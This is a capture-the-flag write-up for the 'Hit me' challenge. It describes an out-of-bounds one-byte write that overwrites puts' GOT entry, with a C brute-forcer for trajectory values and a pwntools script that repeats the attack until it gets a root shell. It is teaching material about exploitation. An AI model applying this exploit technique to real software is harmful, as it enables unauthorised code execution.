# Hit me Feedback
Super cool challenge, and I think super fitting for the finals.

I noted that the `battlefield` data is in the `.bss` section. We can go easily out of bounds with a bug trajactory, but only in positive values. E.g. `x-vel = 0.0000001` and `y-vel = 1000000` causes a big OOB. The loop is terminated on the following condition:
```c
x = (int)(velocity_x * t);
y = start_y + (int)(velocity_y * t - G_2 * t * t);

// ...
if (x < WIDTH && y < HEIGHT) {
    battlefield[y * WIDTH + x] = projectile;
}
// ...
if (x > target_x || y < target_y) {
      return 0;
    }
```
Hence we exit the loop if `x > target_x` or `y < target_y`, where y is often close to 0. If we shoot up in the sky and fall down rapidly, we eventually get negative y values, but only **once** (then `y is definitly < target_y` and we leave the loop). Hence we can provide a one byte overwrite on "close" enough memory OOB in negative values!

The distance between `battlefield` and the `puts.got.plt` is -0x110 bytes. If we set `y = -5` and `x = 48`, we access the LSB of the `puts.got.plt`. With `x = 49` we access the second LSB.

I bruteforced values for x_velocity and y_velocity such that those conditions are fullfilled. We have to get a target with x >= 49, but thats often enough the case and we have 10 attemps. Bruteforce code:
```
c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define WIDTH 64
#define HEIGHT 16

const int start_y = HEIGHT / 2;
const double G_2 = 9.81 / 2.0;
const double TSCALE = 0.005;


int main() {
    for (int i = 20000; i < 100000; i++) {
        //for (double j = 0; j < 5; j += 0.01f) { // this loop was not needed in the end
            int x = 0;
            int y = start_y;
            double velocity_x = 0.01f;
            double velocity_y = (float)i;

            int target_x = 50;
            int target_y = 1;

            for (int ti = 0;; ti++) {
                double t = ti * TSCALE;
                x = (int)(velocity_x * t);
                y = start_y + (int)(velocity_y * t - G_2 * t * t);

                if (x < WIDTH && y < HEIGHT) {
                    
                }   

                if (x == target_x && y == target_y) {
                return 1;
                } else if (x > target_x || y < target_y) {
                    if (y == -5) {
                        printf("Exit loop with with last y: %d x: %d Velocity X: %lf Velocity Y: %lf\n", y, x, velocity_x, velocity_y);
                    }
                    break;
                }
           // }
        }
    }
    

}
```

We can hardcode those velocities and overwrite the two LSBs of the `puts.got.plt` precicely. Since `puts` hasn't been called yet, it points to the resolver function inside the binary and we can overwrite the 2 LSBs to point to `dont_mind_me`. After all its a 1/16 ASLR bruteforce, but thats fine...

## Solution:
Has to run multiple times, since we have to hit an 1/16 ASLR (12bit nibble is static, 4bit is random). If it stops a shell has been spawned

```python
from pwn import *


for i in range(0, 100):
    p = process("ncat --ssl 6dda62cc1456a086245d2640-hit-me.challenge.master.cscg.live 31337", shell=True)
    #p = remote("127.0.0.1", 1024)

    try:
        stage = 1
        for i in range(0, 10):
            p.recvuntil(b"Your target is at ")
            x_target = int(p.recvuntil(b", ")[:-2])
            y_target = int(p.recvuntil(b"\n")[:-1])

            log.debug(f"X target: {x_target} y_target: {y_target}")

            if (stage == 3):
                p.sendlineafter(b"Choose your projectile:", b"A")
                p.sendlineafter(b"]>", b"H")
                p.sendline("whoami")
                recved = p.recvuntil("root", timeout=1)

                if (b"root" in recved): # we got a shell \o/
                    p.interactive() # spawn shell
                else:
                    log.warning("Failed :/")
                    break

            if x_target >= 49: # good for OOB write
                log.success(f"Good target found in try: {i}!")
                if stage == 1: # overwrite first byte to dont_mind_me
                    stage = 2
                    p.sendlineafter(b"Choose your projectile:", b"\xA0") # 0xA0
                    p.sendlineafter(b"]>", b"X 0.010000")
                    p.sendlineafter(b"]>", b"Y 23944.000000")
                    p.sendlineafter(b"]>", b"F")

                elif (stage == 2):
                    stage = 3
                    p.sendlineafter(b"Choose your projectile:", b"\x27") # 0x20
                    p.sendlineafter(b"]>", b"X 0.010000")
                    p.sendlineafter(b"]>", b"Y 24197.000000")
                    p.sendlineafter(b"]>", b"F")

            else:
                p.sendlineafter(b"Choose your projectile:", b"A")
                p.sendlineafter(b"]>", b"X 10")
                p.sendlineafter(b"]>", b"Y 10")
                p.sendlineafter(b"]>", b"F")
    except Exception as e:
        print(e)
        pass

```